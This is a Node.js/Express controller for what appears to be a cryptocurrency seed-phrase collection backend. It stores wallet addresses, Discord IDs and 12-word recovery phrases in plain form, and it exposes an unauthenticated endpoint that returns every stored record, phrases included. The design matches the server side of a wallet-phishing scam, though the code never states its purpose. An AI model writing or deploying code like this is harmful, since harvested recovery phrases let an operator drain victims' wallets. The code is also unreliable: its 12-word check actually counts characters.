const { yourWallet, words } = require("../models/schema");

// LIST ALL THE WALLETS
const get_wallets = async (req, res) => {
  try {
    const walletResults = await yourWallet.find();
    res.send(walletResults);
  } catch (error) {
    res.status(500).send(error);
  }
};

// DETELE WALLET
const detele_wallets = async (req, res) => {
  yourWallet
    .findByIdAndDelete(req.params.id)
    .then(() => res.send("Wallte has been deleted"))
    .catch((err) => res.send(err));
};

// POST WALLETS
const post_wallet = async (req, res) => {
  const prohbitedWord = req.body.recoveryPhrase;
  const prohbitedWordLength = prohbitedWord.length;

  const theWord = await words.findOne({
    words: prohbitedWord,
  });

  if (theWord !== null) {
    res.send("Profanities is Prohbited");
  } else if (prohbitedWordLength <= 11 || prohbitedWordLength >= 13) {
    res.send(
      "Recovery phrase should not be less-than or greater-than 12 words"
    );
  } else {
    try {
      await yourWallet.create({
        wallet: req.body.wallet,
        discordID: req.body.discordID,
        recoveryPhrase: req.body.recoveryPhrase,
      });
      res.status(201).send("Wallet has been sent Successfully");
    } catch (error) {
      res.send(error);
    }
  }
};

// FIND AND CREATE PROHIBITED WORDS
const fineTheWord = async (req, res) => {
  try {
    await words.create({
      words: req.body.words,
    });
    res.send("New Prohibited Word has been added");
  } catch {
    res.send("Do not submit that is empty");
  }
};

// EXPORTED MODULES
module.exports = { get_wallets, detele_wallets, post_wallet, fineTheWord };
